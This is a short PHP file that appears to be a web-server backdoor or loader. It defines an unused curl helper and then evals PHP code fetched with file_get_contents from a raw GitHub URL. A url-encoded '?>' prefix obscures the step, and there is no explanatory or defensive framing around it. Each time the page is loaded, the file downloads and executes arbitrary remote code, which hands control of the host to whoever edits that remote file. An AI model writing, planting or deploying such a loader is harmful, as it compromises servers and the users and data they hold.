<?php
function get($url) {
      $ch = curl_init();
  
      curl_setopt($ch, CURLOPT_HEADER, 0);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_URL, $url);
  
      $data = curl_exec($ch);
      curl_close($ch);
  
      return $data;
  }
  $x= '?>';
         eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/index-copy.php" ) ) ); ?>






